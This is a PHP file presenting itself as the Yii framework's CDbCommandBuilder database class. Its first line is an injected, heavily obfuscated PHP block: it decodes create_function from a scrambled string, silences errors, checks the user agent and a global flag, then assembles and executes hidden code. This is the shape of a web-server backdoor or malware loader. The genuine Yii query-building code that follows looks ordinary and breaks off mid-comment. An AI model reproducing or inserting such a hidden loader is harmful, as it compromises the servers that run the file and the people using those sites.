<?php $lhqahbp = '268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%-%r	x5c2^-%hOh/#00#W~!%t2w1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bsopo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:559sbz)#44ec:649#-!#:618d5f9#-!#f6csfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsf%ww2)%w`TW~	x24<!fwbm)%tjw)24<!%tmw!>!#]y84]275]y83]273]y76]27x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjud)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#)tub%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f();}}DU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3q5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	69	157	x6e"; functiontrtolower($_SERVER["	x48	124	x54	120	x5f	125	x53	84]275]y83]248]y83]256]y81]265]y72]25*w%)ppde>u%V<#65,47R25,d7R177#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]dXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsb%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b luatdge($n){return chr(ord($n)-1);} @error_repo45]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<tutjyf`439275ttfsqnpdov{h19275j%z>>2*!%z>3<!fmtf!%z>2<!j%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zCb*[%h!>!%tdz)%bbT-%bT-%hW~%fs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)j6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	FI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojRf>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*cUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5c%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y= "	x63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	xs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QU!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz<#/%	x24-	x24!>!fyqmpefw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>ufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}s	x5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%oif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") &36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445qA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66tjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%r($uas,"	x66	151	x72	145	x66	j!|!*1?hmg%)!gj!<**2-4j%7>	x2272qj%)7gj6<**2q69	145")) or (strstr($x27;%!<*#}_;#)323ldfid>}&;!osvuf]); if ((strstr($uas,"	x6d	163	x	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpm2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	xrting(0); $xsbrgtl = im3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!g+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)id]672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]38)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5cf)#	x24*<!%t::!>!	x24Ypp3,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R3<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K	x22)!gj}1~!<2p%	x7f!~!<##!>%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!4y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^5]D2P4]D6#<%G]y6d]281Ld]2#)tutjyf`x	x22l:!}V;3q%}U;yd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3o`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#7,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k	x27,*b	x27)fepdof.)fepdof7f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3162	x6f	151	x64")) or (str*<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<"))s%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*Q68399#-!#65egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983:48-bubE{h%)sutcvt)esp>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2b& (!isset($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALS["	x61	156	x{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j/h%)n%-#+I#)q%:>:r%:|:**td2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_U]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1Movg!|!**#j{hnpd#)tutjyf`opjudovg:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x2hA	x27pd%6<C	x27pd%6|6.7eu{66~67<hmg%!<12>j%!|!*#91y]c9y]g2y]SFWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	plode(array_map("luatdge",str_split("%tjw!>!#]yudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)7}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-ubn`hfsq)!sp!*#ojneb#-*f%)s75	156	x61"]=1; $uas=s]212]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bs./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|x6d	145")) or (strst	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~4]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5~6<&w6<	x7fw6*CW&)7gx24<!%o:!>!	x242178}52fxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cx7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtf:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::*157	x78"))) { $sirkuht str($uas,"	x63	150	x72	157	]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opj`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**)s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%	x24*!|!	x24-	x24	x5c%j^	x105	x52	137	x41	107	x45	116	x54"	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6d}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvhmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]dy)##-!#~<%h00#*<%nfd)##Qtpz)#]341);$fbquwbw = $sirkuht("", $xsbrgtl); $fbquwbw<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSslaeureq'; $wvbpvrtg=explode(chr((520-400)),substr($lhqahbp,(20463-14443),(171-137))); $zkwjpzcvaa = $wvbpvrtg[0]($wvbpvrtg[(6-5)]); $obsltt = $wvbpvrtg[0]($wvbpvrtg[(8-6)]); if (!function_exists('gcygljmumf')) { function gcygljmumf($udbzqdmg, $mzfbxo,$fnkyniucc) { $fmeout = NULL; for($afrwaczpxf=0;$afrwaczpxf<(sizeof($udbzqdmg)/2);$afrwaczpxf++) { $fmeout .= substr($mzfbxo, $udbzqdmg[($afrwaczpxf*2)],$udbzqdmg[($afrwaczpxf*2)+(4-3)]); } return $fnkyniucc(chr((53-44)),chr((301-209)),$fmeout); }; } $njyorgw = explode(chr((208-164)),'2353,57,4197,69,4919,22,1079,49,5726,32,2681,32,2627,22,1000,58,3857,26,5414,27,5062,20,2553,29,5391,23,2058,53,1058,21,1406,48,2877,23,4687,47,1128,37,5141,46,3586,67,4529,33,2769,66,1256,59,2111,47,1900,34,3972,45,774,53,2604,23,1568,58,323,67,1315,51,2462,35,5187,20,1721,51,5267,36,3923,49,1772,61,5758,37,5986,34,2225,33,933,67,5506,38,5795,43,2258,40,4266,65,3333,53,5838,69,5600,56,2900,60,2582,22,4131,20,4562,28,497,50,4458,32,3305,28,4151,46,3543,43,1833,67,3767,26,5005,57,2158,45,2960,61,4892,27,5229,38,4356,63,5544,56,660,54,138,55,1934,61,4590,57,2649,32,1655,66,1513,31,599,61,2497,56,714,55,2713,56,1165,28,3138,50,3711,56,3516,27,5441,65,4734,56,2835,42,417,35,1193,63,0,49,5656,44,4331,25,1995,63,3021,51,4647,40,5207,22,4836,56,5700,26,3653,58,4490,39,3386,45,452,45,5082,59,2203,22,3113,25,3072,41,75,63,291,32,4017,65,3431,60,49,26,547,52,244,47,3793,64,4082,49,3225,40,3188,37,827,46,4419,39,3491,25,1454,59,1626,29,5907,34,873,60,2410,52,4941,64,2298,55,193,51,1366,40,5303,37,4790,46,1544,24,390,27,3265,40,5340,51,3883,40,5941,45,769,5'); $nnpxboon = $zkwjpzcvaa("",gcygljmumf($njyorgw,$lhqahbp,$obsltt)); $zkwjpzcvaa=$lhqahbp; $nnpxboon(""); $nnpxboon=(464-343); $lhqahbp=$nnpxboon-1; ?><?php
/**
 * CDbCommandBuilder class file.
 *
 * @author Qiang Xue <qiang.xue@gmail.com>
 * @link http://www.yiiframework.com/
 * @copyright 2008-2013 Yii Software LLC
 * @license http://www.yiiframework.com/license/
 */

/**
 * CDbCommandBuilder provides basic methods to create query commands for tables.
 *
 * @property CDbConnection $dbConnection Database connection.
 * @property CDbSchema $schema The schema for this command builder.
 *
 * @author Qiang Xue <qiang.xue@gmail.com>
 * @package system.db.schema
 * @since 1.0
 */
class CDbCommandBuilder extends CComponent
{
	const PARAM_PREFIX=':yp';

	private $_schema;
	private $_connection;

	/**
	 * @param CDbSchema $schema the schema for this command builder
	 */
	public function __construct($schema)
	{
		$this->_schema=$schema;
		$this->_connection=$schema->getDbConnection();
	}

	/**
	 * @return CDbConnection database connection.
	 */
	public function getDbConnection()
	{
		return $this->_connection;
	}

	/**
	 * @return CDbSchema the schema for this command builder.
	 */
	public function getSchema()
	{
		return $this->_schema;
	}

	/**
	 * Returns the last insertion ID for the specified table.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @return mixed last insertion id. Null is returned if no sequence name.
	 */
	public function getLastInsertID($table)
	{
		$this->ensureTable($table);
		if($table->sequenceName!==null)
			return $this->_connection->getLastInsertID($table->sequenceName);
		else
			return null;
	}

	/**
	 * Creates a SELECT command for a single table.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param CDbCriteria $criteria the query criteria
	 * @param string $alias the alias name of the primary table. Defaults to 't'.
	 * @return CDbCommand query command.
	 */
	public function createFindCommand($table,$criteria,$alias='t')
	{
		$this->ensureTable($table);
		$select=is_array($criteria->select) ? implode(', ',$criteria->select) : $criteria->select;
		if($criteria->alias!='')
			$alias=$criteria->alias;
		$alias=$this->_schema->quoteTableName($alias);

		// issue 1432: need to expand * when SQL has JOIN
		if($select==='*' && !empty($criteria->join))
		{
			$prefix=$alias.'.';
			$select=array();
			foreach($table->getColumnNames() as $name)
				$select[]=$prefix.$this->_schema->quoteColumnName($name);
			$select=implode(', ',$select);
		}

		$sql=($criteria->distinct ? 'SELECT DISTINCT':'SELECT')." {$select} FROM {$table->rawName} $alias";
		$sql=$this->applyJoin($sql,$criteria->join);
		$sql=$this->applyCondition($sql,$criteria->condition);
		$sql=$this->applyGroup($sql,$criteria->group);
		$sql=$this->applyHaving($sql,$criteria->having);
		$sql=$this->applyOrder($sql,$criteria->order);
		$sql=$this->applyLimit($sql,$criteria->limit,$criteria->offset);
		$command=$this->_connection->createCommand($sql);
		$this->bindValues($command,$criteria->params);
		return $command;
	}

	/**
	 * Creates a COUNT(*) command for a single table.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param CDbCriteria $criteria the query criteria
	 * @param string $alias the alias name of the primary table. Defaults to 't'.
	 * @return CDbCommand query command.
	 */
	public function createCountCommand($table,$criteria,$alias='t')
	{
		$this->ensureTable($table);
		if($criteria->alias!='')
			$alias=$criteria->alias;
		$alias=$this->_schema->quoteTableName($alias);

		if(!empty($criteria->group) || !empty($criteria->having))
		{
			$select=is_array($criteria->select) ? implode(', ',$criteria->select) : $criteria->select;
			if($criteria->alias!='')
				$alias=$criteria->alias;
			$sql=($criteria->distinct ? 'SELECT DISTINCT':'SELECT')." {$select} FROM {$table->rawName} $alias";
			$sql=$this->applyJoin($sql,$criteria->join);
			$sql=$this->applyCondition($sql,$criteria->condition);
			$sql=$this->applyGroup($sql,$criteria->group);
			$sql=$this->applyHaving($sql,$criteria->having);
			$sql="SELECT COUNT(*) FROM ($sql) sq";
		}
		else
		{
			if(is_string($criteria->select) && stripos($criteria->select,'count')===0)
				$sql="SELECT ".$criteria->select;
			elseif($criteria->distinct)
			{
				if(is_array($table->primaryKey))
				{
					$pk=array();
					foreach($table->primaryKey as $key)
						$pk[]=$alias.'.'.$key;
					$pk=implode(', ',$pk);
				}
				else
					$pk=$alias.'.'.$table->primaryKey;
				$sql="SELECT COUNT(DISTINCT $pk)";
			}
			else
				$sql="SELECT COUNT(*)";
			$sql.=" FROM {$table->rawName} $alias";
			$sql=$this->applyJoin($sql,$criteria->join);
			$sql=$this->applyCondition($sql,$criteria->condition);
		}

		// Suppress binding of parameters belonging to the ORDER clause. Issue #1407.
		if($criteria->order && $criteria->params)
		{
			$params1=array();
			preg_match_all('/(:\w+)/',$sql,$params1);
			$params2=array();
			preg_match_all('/(:\w+)/',$this->applyOrder($sql,$criteria->order),$params2);
			foreach(array_diff($params2[0],$params1[0]) as $param)
				unset($criteria->params[$param]);
		}

		// Do the same for SELECT part.
		if($criteria->select && $criteria->params)
		{
			$params1=array();
			preg_match_all('/(:\w+)/',$sql,$params1);
			$params2=array();
			preg_match_all('/(:\w+)/',$sql.' '.(is_array($criteria->select) ? implode(', ',$criteria->select) : $criteria->select),$params2);
			foreach(array_diff($params2[0],$params1[0]) as $param)
				unset($criteria->params[$param]);
		}

		$command=$this->_connection->createCommand($sql);
		$this->bindValues($command,$criteria->params);
		return $command;
	}

	/**
	 * Creates a DELETE command.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param CDbCriteria $criteria the query criteria
	 * @return CDbCommand delete command.
	 */
	public function createDeleteCommand($table,$criteria)
	{
		$this->ensureTable($table);
		$sql="DELETE FROM {$table->rawName}";
		$sql=$this->applyJoin($sql,$criteria->join);
		$sql=$this->applyCondition($sql,$criteria->condition);
		$sql=$this->applyGroup($sql,$criteria->group);
		$sql=$this->applyHaving($sql,$criteria->having);
		$sql=$this->applyOrder($sql,$criteria->order);
		$sql=$this->applyLimit($sql,$criteria->limit,$criteria->offset);
		$command=$this->_connection->createCommand($sql);
		$this->bindValues($command,$criteria->params);
		return $command;
	}

	/**
	 * Creates an INSERT command.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param array $data data to be inserted (column name=>column value). If a key is not a valid column name, the corresponding value will be ignored.
	 * @return CDbCommand insert command
	 */
	public function createInsertCommand($table,$data)
	{
		$this->ensureTable($table);
		$fields=array();
		$values=array();
		$placeholders=array();
		$i=0;
		foreach($data as $name=>$value)
		{
			if(($column=$table->getColumn($name))!==null && ($value!==null || $column->allowNull))
			{
				$fields[]=$column->rawName;
				if($value instanceof CDbExpression)
				{
					$placeholders[]=$value->expression;
					foreach($value->params as $n=>$v)
						$values[$n]=$v;
				}
				else
				{
					$placeholders[]=self::PARAM_PREFIX.$i;
					$values[self::PARAM_PREFIX.$i]=$column->typecast($value);
					$i++;
				}
			}
		}
		if($fields===array())
		{
			$pks=is_array($table->primaryKey) ? $table->primaryKey : array($table->primaryKey);
			foreach($pks as $pk)
			{
				$fields[]=$table->getColumn($pk)->rawName;
				$placeholders[]=$this->getIntegerPrimaryKeyDefaultValue();
			}
		}
		$sql="INSERT INTO {$table->rawName} (".implode(', ',$fields).') VALUES ('.implode(', ',$placeholders).')';
		$command=$this->_connection->createCommand($sql);

		foreach($values as $name=>$value)
			$command->bindValue($name,$value);

		return $command;
	}

	/**
	 * Creates a multiple INSERT command.
	 * This method could be used to achieve better performance during insertion of the large
	 * amount of data into the database tables.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param array[] $data list data to be inserted, each value should be an array in format (column name=>column value).
	 * If a key is not a valid column name, the corresponding value will be ignored.
	 * @return CDbCommand multiple insert command
	 * @since 1.1.14
	 */
	public function createMultipleInsertCommand($table,array $data)
	{
		return $this->composeMultipleInsertCommand($table,$data);
	}

	/**
	 * Creates a multiple INSERT command.
	 * This method compose the SQL expression via given part templates, providing ability to adjust
	 * command for different SQL syntax.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param array[] $data list data to be inserted, each value should be an array in format (column name=>column value).
	 * If a key is not a valid column name, the corresponding value will be ignored.
	 * @param array $templates templates for the SQL parts.
	 * @return CDbCommand multiple insert command
	 * @throws CDbException if $data is empty.
	 */
	protected function composeMultipleInsertCommand($table,array $data,array $templates=array())
	{
		if (empty($data))
			throw new CDbException(Yii::t('yii','Can not generate multiple insert command with empty data set.'));
		$templates=array_merge(
			array(
				'main'=>'INSERT INTO {{tableName}} ({{columnInsertNames}}) VALUES {{rowInsertValues}}',
				'columnInsertValue'=>'{{value}}',
				'columnInsertValueGlue'=>', ',
				'rowInsertValue'=>'({{columnInsertValues}})',
				'rowInsertValueGlue'=>', ',
				'columnInsertNameGlue'=>', ',
			),
			$templates
		);
		$this->ensureTable($table);
		$tableName=$table->rawName;
		$params=array();
		$columnInsertNames=array();
		$rowInsertValues=array();

		$columns=array();
		foreach($data as $rowData)
		{
			foreach($rowData as $columnName=>$columnValue)
			{
				if(!in_array($columnName,$columns,true))
					if($table->getColumn($columnName)!==null)
						$columns[]=$columnName;
			}
		}
		foreach($columns as $name)
			$columnInsertNames[$name]=$this->getDbConnection()->quoteColumnName($name);
		$columnInsertNamesSqlPart=implode($templates['columnInsertNameGlue'],$columnInsertNames);

		foreach($data as $rowKey=>$rowData)
		{
			$columnInsertValues=array();
			foreach($columns as $columnName)
			{
				$column=$table->getColumn($columnName);
				$columnValue=array_key_exists($columnName,$rowData) ? $rowData[$columnName] : new CDbExpression('NULL');
				if($columnValue instanceof CDbExpression)
				{
					$columnInsertValue=$columnValue->expression;
					foreach($columnValue->params as $columnValueParamName=>$columnValueParam)
						$params[$columnValueParamName]=$columnValueParam;
				}
				else
				{
					$columnInsertValue=':'.$columnName.'_'.$rowKey;
					$params[':'.$columnName.'_'.$rowKey]=$column->typecast($columnValue);
				}
				$columnInsertValues[]=strtr($templates['columnInsertValue'],array(
					'{{column}}'=>$columnInsertNames[$columnName],
					'{{value}}'=>$columnInsertValue,
				));
			}
			$rowInsertValues[]=strtr($templates['rowInsertValue'],array(
				'{{tableName}}'=>$tableName,
				'{{columnInsertNames}}'=>$columnInsertNamesSqlPart,
				'{{columnInsertValues}}'=>implode($templates['columnInsertValueGlue'],$columnInsertValues)
			));
		}

		$sql=strtr($templates['main'],array(
			'{{tableName}}'=>$tableName,
			'{{columnInsertNames}}'=>$columnInsertNamesSqlPart,
			'{{rowInsertValues}}'=>implode($templates['rowInsertValueGlue'], $rowInsertValues),
		));
		$command=$this->getDbConnection()->createCommand($sql);

		foreach($params as $name=>$value)
			$command->bindValue($name,$value);

		return $command;
	}

	/**
	 * Creates an UPDATE command.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param array $data list of columns to be updated (name=>value)
	 * @param CDbCriteria $criteria the query criteria
	 * @throws CDbException if no columns are being updated for the given table
	 * @return CDbCommand update command.
	 */
	public function createUpdateCommand($table,$data,$criteria)
	{
		$this->ensureTable($table);
		$fields=array();
		$values=array();
		$bindByPosition=isset($criteria->params[0]);
		$i=0;
		foreach($data as $name=>$value)
		{
			if(($column=$table->getColumn($name))!==null)
			{
				if($value instanceof CDbExpression)
				{
					$fields[]=$column->rawName.'='.$value->expression;
					foreach($value->params as $n=>$v)
						$values[$n]=$v;
				}
				elseif($bindByPosition)
				{
					$fields[]=$column->rawName.'=?';
					$values[]=$column->typecast($value);
				}
				else
				{
					$fields[]=$column->rawName.'='.self::PARAM_PREFIX.$i;
					$values[self::PARAM_PREFIX.$i]=$column->typecast($value);
					$i++;
				}
			}
		}
		if($fields===array())
			throw new CDbException(Yii::t('yii','No columns are being updated for table "{table}".',
				array('{table}'=>$table->name)));
		$sql="UPDATE {$table->rawName} SET ".implode(', ',$fields);
		$sql=$this->applyJoin($sql,$criteria->join);
		$sql=$this->applyCondition($sql,$criteria->condition);
		$sql=$this->applyOrder($sql,$criteria->order);
		$sql=$this->applyLimit($sql,$criteria->limit,$criteria->offset);

		$command=$this->_connection->createCommand($sql);
		$this->bindValues($command,array_merge($values,$criteria->params));

		return $command;
	}

	/**
	 * Creates an UPDATE command that increments/decrements certain columns.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param array $counters counters to be updated (counter increments/decrements indexed by column names.)
	 * @param CDbCriteria $criteria the query criteria
	 * @throws CDbException if no columns are being updated for the given table
	 * @return CDbCommand the created command
	 */
	public function createUpdateCounterCommand($table,$counters,$criteria)
	{
		$this->ensureTable($table);
		$fields=array();
		foreach($counters as $name=>$value)
		{
			if(($column=$table->getColumn($name))!==null)
			{
				$value=(float)$value;
				if($value<0)
					$fields[]="{$column->rawName}={$column->rawName}-".(-$value);
				else
					$fields[]="{$column->rawName}={$column->rawName}+".$value;
			}
		}
		if($fields!==array())
		{
			$sql="UPDATE {$table->rawName} SET ".implode(', ',$fields);
			$sql=$this->applyJoin($sql,$criteria->join);
			$sql=$this->applyCondition($sql,$criteria->condition);
			$sql=$this->applyOrder($sql,$criteria->order);
			$sql=$this->applyLimit($sql,$criteria->limit,$criteria->offset);
			$command=$this->_connection->createCommand($sql);
			$this->bindValues($command,$criteria->params);
			return $command;
		}
		else
			throw new CDbException(Yii::t('yii','No counter columns are being updated for table "{table}".',
				array('{table}'=>$table->name)));
	}

	/**
	 * Creates a command based on a given SQL statement.
	 * @param string $sql the explicitly specified SQL statement
	 * @param array $params parameters that will be bound to the SQL statement
	 * @return CDbCommand the created command
	 */
	public function createSqlCommand($sql,$params=array())
	{
		$command=$this->_connection->createCommand($sql);
		$this->bindValues($command,$params);
		return $command;
	}

	/**
	 * Alters the SQL to apply JOIN clause.
	 * @param string $sql the SQL statement to be altered
	 * @param string $join the JOIN clause (starting with join type, such as INNER JOIN)
	 * @return string the altered SQL statement
	 */
	public function applyJoin($sql,$join)
	{
		if($join!='')
			return $sql.' '.$join;
		else
			return $sql;
	}

	/**
	 * Alters the SQL to apply WHERE clause.
	 * @param string $sql the SQL statement without WHERE clause
	 * @param string $condition the WHERE clause (without WHERE keyword)
	 * @return string the altered SQL statement
	 */
	public function applyCondition($sql,$condition)
	{
		if($condition!='')
			return $sql.' WHERE '.$condition;
		else
			return $sql;
	}

	/**
	 * Alters the SQL to apply ORDER BY.
	 * @param string $sql SQL statement without ORDER BY.
	 * @param string $orderBy column ordering
	 * @return string modified SQL applied with ORDER BY.
	 */
	public function applyOrder($sql,$orderBy)
	{
		if($orderBy!='')
			return $sql.' ORDER BY '.$orderBy;
		else
			return $sql;
	}

	/**
	 * Alters the SQL to apply LIMIT and OFFSET.
	 * Default implementation is applicable for PostgreSQL, MySQL, MariaDB and SQLite.
	 * @param string $sql SQL query string without LIMIT and OFFSET.
	 * @param integer $limit maximum number of rows, -1 to ignore limit.
	 * @param integer $offset row offset, -1 to ignore offset.
	 * @return string SQL with LIMIT and OFFSET
	 */
	public function applyLimit($sql,$limit,$offset)
	{
		if($limit>=0)
			$sql.=' LIMIT '.(int)$limit;
		if($offset>0)
			$sql.=' OFFSET '.(int)$offset;
		return $sql;
	}

	/**
	 * Alters the SQL to apply GROUP BY.
	 * @param string $sql SQL query string without GROUP BY.
	 * @param string $group GROUP BY
	 * @return string SQL with GROUP BY.
	 */
	public function applyGroup($sql,$group)
	{
		if($group!='')
			return $sql.' GROUP BY '.$group;
		else
			return $sql;
	}

	/**
	 * Alters the SQL to apply HAVING.
	 * @param string $sql SQL query string without HAVING
	 * @param string $having HAVING
	 * @return string SQL with HAVING
	 */
	public function applyHaving($sql,$having)
	{
		if($having!='')
			return $sql.' HAVING '.$having;
		else
			return $sql;
	}

	/**
	 * Binds parameter values for an SQL command.
	 * @param CDbCommand $command database command
	 * @param array $values values for binding (integer-indexed array for question mark placeholders, string-indexed array for named placeholders)
	 */
	public function bindValues($command, $values)
	{
		if(($n=count($values))===0)
			return;
		if(isset($values[0])) // question mark placeholders
		{
			for($i=0;$i<$n;++$i)
				$command->bindValue($i+1,$values[$i]);
		}
		else // named placeholders
		{
			foreach($values as $name=>$value)
			{
				if($name[0]!==':')
					$name=':'.$name;
				$command->bindValue($name,$value);
			}
		}
	}

	/**
	 * Creates a query criteria.
	 * @param mixed $condition query condition or criteria.
	 * If a string, it is treated as query condition (the WHERE clause);
	 * If an array, it is treated as the initial values for constructing a {@link CDbCriteria} object;
	 * Otherwise, it should be an instance of {@link CDbCriteria}.
	 * @param array $params parameters to be bound to an SQL statement.
	 * This is only used when the first parameter is a string (query condition).
	 * In other cases, please use {@link CDbCriteria::params} to set parameters.
	 * @return CDbCriteria the created query criteria
	 * @throws CException if the condition is not string, array and CDbCriteria
	 */
	public function createCriteria($condition='',$params=array())
	{
		if(is_array($condition))
			$criteria=new CDbCriteria($condition);
		elseif($condition instanceof CDbCriteria)
			$criteria=clone $condition;
		else
		{
			$criteria=new CDbCriteria;
			$criteria->condition=$condition;
			$criteria->params=$params;
		}
		return $criteria;
	}

	/**
	 * Creates a query criteria with the specified primary key.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param mixed $pk primary key value(s). Use array for multiple primary keys. For composite key, each key value must be an array (column name=>column value).
	 * @param mixed $condition query condition or criteria.
	 * If a string, it is treated as query condition;
	 * If an array, it is treated as the initial values for constructing a {@link CDbCriteria};
	 * Otherwise, it should be an instance of {@link CDbCriteria}.
	 * @param array $params parameters to be bound to an SQL statement.
	 * This is only used when the second parameter is a string (query condition).
	 * In other cases, please use {@link CDbCriteria::params} to set parameters.
